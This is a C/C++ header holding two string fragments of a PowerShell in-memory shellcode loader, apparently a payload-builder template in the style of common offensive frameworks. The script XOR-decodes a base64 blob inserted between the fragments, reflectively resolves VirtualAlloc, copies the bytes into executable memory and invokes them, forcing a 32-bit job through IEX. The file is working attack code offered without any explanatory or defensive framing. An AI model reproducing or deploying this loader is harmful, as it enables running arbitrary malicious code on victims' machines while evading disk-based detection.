#pragma once
char* scriptUp = "Set-StrictMode -Version 2\n\
$DoIt = @'\n\
function func_get_proc_address{\n\
	Param($var_module, $var_procedure)\n\
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress',[Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n\
}\n\
function func_get_delegate_type{\n\
	Param(\n\
		[Parameter(Position = 0, Mandatory = $True)][Type[]] $var_parameters,\n\
		[Parameter(Position = 1)][Type] $var_return_type = [Void]\n\
	)\n\
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])\n\
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\
	return $var_type_builder.CreateType()\n\
}\n\
[Byte[]]$var_code = [System.Convert]::FromBase64String('";

char* scriptDown = "')\n\
for ($x = 0; $x -lt $var_code.Count; $x++) {\n\
$var_code[$x] = $var_code[$x] -bxor 88\n\
}\n\
$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n\
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n\
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\
$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n\
$var_runme.Invoke([IntPtr]::Zero)\n\
'@\n\
If([IntPtr]::size -eq 8) {\n\
	start-job{ param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n\
}\n\
else {\n\
IEX $DoIt\n\
}";
